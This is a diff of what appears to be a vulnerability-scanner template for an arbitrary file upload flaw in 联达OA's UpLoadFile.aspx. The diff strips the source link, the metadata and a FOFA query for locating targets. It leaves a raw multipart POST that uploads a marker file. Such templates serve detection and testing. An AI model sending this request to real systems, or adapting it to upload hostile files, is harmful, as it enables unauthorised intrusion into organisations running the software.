@@ -3,12 +3,8 @@ info:
   name: 联达OA-UpLoadFile.aspx 任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/saih67xv7s2yub2v'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: saih67xv7s2yub2v
-    fofa: app="联达OA"
 http:
 - raw:
   - 'POST /FileManage/UpLoadFile.aspx HTTP/1.1
@@ -23,14 +19,10 @@ http:
     Connection: close
 
 
-
-
     --00content0boundary00
 
 
     Content-Disposition: form-data; name="DesignId"
-
-
 
 
     1
@@ -43,8 +35,6 @@ http:
 
 
     Content-Type: image/png
-
-
 
 
     dudesite
